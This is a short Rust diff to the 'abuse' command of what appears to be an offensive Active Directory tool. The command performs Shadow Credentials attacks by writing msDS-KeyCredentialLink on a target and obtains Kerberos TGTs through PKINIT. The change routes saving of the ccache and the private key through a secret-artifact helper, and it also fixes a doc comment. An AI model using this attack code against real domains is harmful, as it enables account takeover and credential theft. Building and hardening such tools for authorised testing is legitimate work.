@@ -147,7 +147,11 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
         let tgt =
             adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
         let cc_path = format!("{}.ccache", a.target);
-        std::fs::write(&cc_path, tgt.ccache.expose())?;
+        adhammer_core::write_secret_artifact(
+            std::path::Path::new(&cc_path),
+            adhammer_core::SecretArtifact::Ccache,
+            tgt.ccache.expose(),
+        )?;
         println!(
             "[+] PKINIT succeeded — TGT for {}@{} (via {})",
             a.target, realm, tgt.sname
@@ -231,10 +235,14 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 dry_run_line("msDS-KeyCredentialLink", &target_dn, &kc.dn_binary);
                 return Ok(());
             }
+            let key_path = format!("{}.key.pem", a.target);
+            adhammer_core::write_secret_artifact(
+                std::path::Path::new(&key_path),
+                adhammer_core::SecretArtifact::PrivateKey,
+                kc.private_key_pem.as_bytes(),
+            )?;
             c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary)
                 .await?;
-            let key_path = format!("{}.key.pem", a.target);
-            std::fs::write(&key_path, &kc.private_key_pem)?;
             println!(
                 "[+] added Shadow Credential to {} — key saved to {key_path}",
                 a.target
@@ -475,7 +483,7 @@ fn format_gplink_entry(guid: &str, base_dn: &str) -> String {
 }
 
 /// SECURITY_DESCRIPTOR_RELATIVE header layout (MS-DTYP §2.4.6):
-///     [0]  Revision(1) [1] Sbz1(1) [2..4] Control(2) LE
+///     \[0]  Revision(1) \[1] Sbz1(1) \[2..4] Control(2) LE
 ///     [4..8]   OwnerOffset  LE
 ///     [8..12]  GroupOffset  LE
 ///     [12..16] SaclOffset   LE
